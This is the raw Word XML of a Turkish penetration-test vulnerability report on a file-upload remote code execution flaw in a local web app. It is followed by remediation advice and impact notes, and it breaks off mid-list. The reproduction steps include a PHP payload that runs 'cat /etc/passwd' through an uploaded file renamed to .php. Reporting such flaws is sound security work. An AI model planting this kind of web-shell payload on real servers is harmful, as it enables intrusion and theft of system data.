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7424A" w14:textId="64C1B185" w:rsidR="00653376" w:rsidRDefault="00000000" w:rsidP="00991F03">
      <w:pPr>
        <w:pStyle w:val="KonuBal"/>
      </w:pPr>
      <w:r>
        <w:t>Zafiyet Raporu</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71E75228" w14:textId="5247B208" w:rsidR="006D1C31" w:rsidRDefault="006D1C31" w:rsidP="006D1C31">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r w:rsidRPr="006D1C31">
        <w:t xml:space="preserve">1 ) </w:t>
      </w:r>
      <w:r w:rsidR="000E77F0" w:rsidRPr="006D1C31">
        <w:t>Remote Code Execution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0784A30E" w14:textId="77777777" w:rsidR="002A5B2A" w:rsidRPr="002A5B2A" w:rsidRDefault="002A5B2A" w:rsidP="002A5B2A"/>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="ListeTablo4-Vurgu6"/>
        <w:tblW w:w="9214" w:type="dxa"/>
        <w:tblInd w:w="-34" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9214"/>
      </w:tblGrid>
      <w:tr w:rsidR="00224837" w14:paraId="13D89460" w14:textId="77777777" w:rsidTr="00BF4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left w:val="single" w:sz="4" w:space="0" w:color="FABF8F" w:themeColor="accent6" w:themeTint="99"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD" w:themeFill="accent1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="776C612B" w14:textId="57717CD1" w:rsidR="00224837" w:rsidRDefault="00224837" w:rsidP="005C66ED">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Zafiyet </w:t>
            </w:r>
            <w:r w:rsidR="001834B6">
              <w:t>Adı</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF4DE0" w14:paraId="57968701" w14:textId="77777777" w:rsidTr="00BF4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left w:val="single" w:sz="4" w:space="0" w:color="FABF8F" w:themeColor="accent6" w:themeTint="99"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="782C53C4" w14:textId="5C734877" w:rsidR="00BF4DE0" w:rsidRDefault="00BF4DE0" w:rsidP="005C66ED">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Remote Code Execution</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF4DE0" w14:paraId="636253E1" w14:textId="77777777" w:rsidTr="00BF4DE0">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tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="76C0F420" w14:textId="37AB1FEC" w:rsidR="00BF4DE0" w:rsidRDefault="00BF4DE0" w:rsidP="005C66ED">
            <w:pPr>
              <w:spacing w:before="240"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF4DE0" w:rsidRPr="00057867" w14:paraId="18EBD722" w14:textId="77777777" w:rsidTr="00BF4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2C04D004" w14:textId="77777777" w:rsidR="00BF4DE0" w:rsidRDefault="00BF4DE0" w:rsidP="00BF4DE0">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>Zafiyet Açıklaması</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54E9659B" w14:textId="6387AFC6" w:rsidR="00BF4DE0" w:rsidRPr="00BF4DE0" w:rsidRDefault="00BF4DE0" w:rsidP="00BF4DE0">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF4DE0" w:rsidRPr="00057867" w14:paraId="1059BE52" w14:textId="77777777" w:rsidTr="00BF4DE0">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="50AD25D3" w14:textId="7641FA42" w:rsidR="00BF4DE0" w:rsidRPr="00EE6B0D" w:rsidRDefault="00EE6B0D" w:rsidP="006D1C31">
            <w:pPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:hyperlink r:id="rId6" w:history="1">
              <w:r w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>http://127.0.0.1/login.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>adresine gidilir ve giriş yapılır.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">  Ardından </w:t>
            </w:r>
            <w:hyperlink r:id="rId7" w:history="1">
              <w:r w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>http://127.0.0.1/customer_profile.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> adresine gidilir. Profil resmi seçin butonuna tıklanır ve test.jpg dosyası sistemi yüklenir ve istek </w:t>
            </w:r>
            <w:r w:rsidRPr="0020446C">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>BurpSuite proxy aracı ile yakalanır</w:t>
            </w:r>
            <w:r w:rsidR="00CF0A67">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> ve isteğe sağ tıklanıp “send to repeater” seçeneği seçilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53B278A1" w14:textId="6704A243" w:rsidR="00BF4DE0" w:rsidRDefault="00BF4DE0" w:rsidP="00BF4DE0">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="3918F9D8" w14:textId="77777777" w:rsidR="00CF0A67" w:rsidRDefault="00CF0A67" w:rsidP="00CF0A67">
            <w:pPr>
              <w:keepNext/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0C3CEB13" wp14:editId="171F0DD2">
                  <wp:extent cx="5713730" cy="3241040"/>
                  <wp:effectExtent l="0" t="0" r="1270" b="0"/>
                  <wp:docPr id="167797880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3730" cy="3241040"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                          <a:noFill/>
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w14:paraId="74D583C6" w14:textId="68D42B51" w:rsidR="00BF4DE0" w:rsidRPr="00C361DB" w:rsidRDefault="00CF0A67" w:rsidP="00CF0A67">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Görsel -  </w:t>
            </w:r>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:instrText xml:space="preserve"> SEQ Görsel_-_ \* ARABIC </w:instrText>
            </w:r>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00F44B43">
              <w:rPr>
                <w:noProof/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve"> Dosya Yükleme İsteği</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41357006" w14:textId="77777777" w:rsidR="00CF0A67" w:rsidRDefault="00CF0A67" w:rsidP="00CF0A67">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="1AED9D39" w14:textId="50D0ED5F" w:rsidR="00BF4DE0" w:rsidRDefault="00CF0A67" w:rsidP="006D1C31">
            <w:pPr>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">Dosya uzantısı .php ile değiştirilir ve </w:t>
            </w:r>
            <w:r w:rsidRPr="00CF0A67">
              <w:t>Content-Disposition: form-data; name="update_profile_picture"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">Header’ının altına </w:t>
            </w:r>
            <w:r w:rsidRPr="00CF0A67">
              <w:t>“&lt;?php $value = system("cat /etc/passwd");  echo $value; ?&gt;</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>bu payload yazılır. Ardından istek gönderilir. İstek üzerinden dönen Response üzerinden yüklenen dosyanın konumu bulunur. Bulunan konuma (</w:t>
            </w:r>
            <w:hyperlink r:id="rId9" w:history="1">
              <w:r w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                </w:rPr>
                <w:t>http://127.0.0.1/uploads/profile_pictures/66fee6c82b28b_test.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>) istek atılır.</w:t>
            </w:r>
            <w:r w:rsidR="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> Böyle başarıyla sunucu üzerinde uzaktan kod yürütülür.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B4C3E98" w14:textId="77777777" w:rsidR="00991F03" w:rsidRDefault="00991F03" w:rsidP="00991F03">
            <w:pPr>
              <w:keepNext/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3D8FD337" wp14:editId="51A6C1F7">
                  <wp:extent cx="5713730" cy="1332865"/>
                  <wp:effectExtent l="0" t="0" r="1270" b="635"/>
                  <wp:docPr id="3018004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0042" name=""/>
                          <pic:cNvPicPr/>
                        </pic:nvPicPr>
                        <pic:blipFill>
                          <a:blip r:embed="rId10"/>
                          <a:stretch>
                            <a:fillRect/>
                          </a:stretch>
                        </pic:blipFill>
                        <pic:spPr>
                          <a:xfrm>
                            <a:off x="0" y="0"/>
                            <a:ext cx="5713730" cy="1332865"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w14:paraId="3947BE3B" w14:textId="66E27451" w:rsidR="00991F03" w:rsidRPr="00CF0A67" w:rsidRDefault="00991F03" w:rsidP="00991F03">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Görsel -  </w:t>
            </w:r>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:instrText xml:space="preserve"> SEQ Görsel_-_ \* ARABIC </w:instrText>
            </w:r>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00F44B43">
              <w:rPr>
                <w:noProof/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve"> Elde edilen Kullanıcı şifreleri</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF4DE0" w:rsidRPr="00057867" w14:paraId="714754D9" w14:textId="77777777" w:rsidTr="00BF4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4E38BA13" w14:textId="3F2D8D90" w:rsidR="00BF4DE0" w:rsidRPr="00057867" w:rsidRDefault="00BF4DE0" w:rsidP="005C66ED">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:highlight w:val="yellow"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Çözüm Önerisi</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF4DE0" w:rsidRPr="00D60321" w14:paraId="5B24AD7E" w14:textId="77777777" w:rsidTr="00BF4DE0">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="61AC4960" w14:textId="41C9086C" w:rsidR="00BF4DE0" w:rsidRPr="00BF4DE0" w:rsidRDefault="00BF4DE0" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:t xml:space="preserve">  Dosya Türü Kontrolü:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2987E18F" w14:textId="77777777" w:rsidR="00BF4DE0" w:rsidRPr="00BF4DE0" w:rsidRDefault="00BF4DE0" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="11"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Yüklemeye izin verilen dosya türlerini sınırlayın. Sadece belirli dosya türlerine (örneğin, .jpg, .png, .pdf) izin verin.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5CE50430" w14:textId="77777777" w:rsidR="00BF4DE0" w:rsidRPr="00BF4DE0" w:rsidRDefault="00BF4DE0" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="11"/>
              </w:numPr>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Dosya uzantılarını kontrol etmek yeterli değildir; dosya içeriğini de doğrulamak için MIME türü kontrolü yapın</w:t>
            </w:r>
            <w:r w:rsidRPr="00BF4DE0">
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58DE8C17" w14:textId="4C698651" w:rsidR="00BF4DE0" w:rsidRPr="00BF4DE0" w:rsidRDefault="00BF4DE0" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:t xml:space="preserve"> Dosya Boyutu Sınırlaması:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CB12259" w14:textId="77777777" w:rsidR="00BF4DE0" w:rsidRPr="00BF4DE0" w:rsidRDefault="00BF4DE0" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="12"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Yüklenen dosyaların boyutunu sınırlayın. Belirli bir boyutun üzerinde dosya yüklemeyi engelleyin.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="627FA1EC" w14:textId="6AEBDC24" w:rsidR="00BF4DE0" w:rsidRPr="00BF4DE0" w:rsidRDefault="00BF4DE0" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:t>Dosya İsimleri Kontrolü:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5573C2A9" w14:textId="77777777" w:rsidR="00BF4DE0" w:rsidRPr="00BF4DE0" w:rsidRDefault="00BF4DE0" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="13"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Yüklenen dosyaların isimlerini güvenli hale getirin. Dosya isimlerindeki özel karakterleri temizleyin ve dosya isimlerini standart bir formatta düzenleyin.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54FFA4C3" w14:textId="77777777" w:rsidR="00BF4DE0" w:rsidRPr="00BF4DE0" w:rsidRDefault="00BF4DE0" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="13"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Aynı dosya ismi ile yüklenmeleri durumunda yeni isimler verin.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E472A0B" w14:textId="67252747" w:rsidR="00BF4DE0" w:rsidRPr="00402B96" w:rsidRDefault="00BF4DE0" w:rsidP="001834B6">
            <w:pPr>
              <w:keepNext/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF4DE0" w14:paraId="61C86E9E" w14:textId="77777777" w:rsidTr="00BF4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bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD" w:themeFill="accent1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="29209387" w14:textId="6AC4B7BB" w:rsidR="00BF4DE0" w:rsidRDefault="00BF4DE0" w:rsidP="005C66ED">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>Zafiyetin Doğurabileceği Sonuçlar</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF4DE0" w14:paraId="2BF463DE" w14:textId="77777777" w:rsidTr="00BF4DE0">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bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="308C571D" w14:textId="4D6E892B" w:rsidR="00991F03" w:rsidRPr="00991F03" w:rsidRDefault="00991F03" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="15"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Tam Kontrol: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Saldırgan, hedef sistemde tam kontrol sağlayabilir. Bu, dosya sistemine erişim, sistem ayarlarını değiştirme ve yazılımları yükleme veya kaldırma anlamına gelir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A17C8B9" w14:textId="77777777" w:rsidR="00991F03" w:rsidRPr="00991F03" w:rsidRDefault="00991F03" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="1B2B29A4" w14:textId="1BF711F6" w:rsidR="00991F03" w:rsidRPr="00991F03" w:rsidRDefault="00991F03" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Veri Hırsızlığı: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>RCE zafiyeti sayesinde, saldırgan hassas verilere (şifreler, kişisel bilgiler, finansal veriler vb.) erişebilir ve bunları çalabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20218B8D" w14:textId="77777777" w:rsidR="00991F03" w:rsidRPr="00991F03" w:rsidRDefault="00991F03" w:rsidP="00994536">
            <w:pPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="11965A9D" w14:textId="2BAF4614" w:rsidR="00991F03" w:rsidRPr="00991F03" w:rsidRDefault="00991F03" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Zarar Verme: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Saldırgan, hedef sistemde kötü amaçlı yazılımlar, virüsler veya truva atları yükleyerek sistemin işleyişini bozabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2214C355" w14:textId="77777777" w:rsidR="00991F03" w:rsidRPr="00991F03" w:rsidRDefault="00991F03" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="4BBBAAB2" w14:textId="106D1299" w:rsidR="00991F03" w:rsidRPr="00991F03" w:rsidRDefault="00991F03" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Ağ İçin Tehdit: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Hedef sistemin yanı sıra, RCE zafiyetleri, diğer bağlı sistemlere (ağdaki diğer cihazlar, sunucular vb.) de zarar verebilir veya erişim sağlayabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AA4E708" w14:textId="77777777" w:rsidR="00991F03" w:rsidRPr="00991F03" w:rsidRDefault="00991F03" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="126227FE" w14:textId="77777777" w:rsidR="00991F03" w:rsidRPr="00991F03" w:rsidRDefault="00991F03" w:rsidP="00994536">
            <w:pPr>
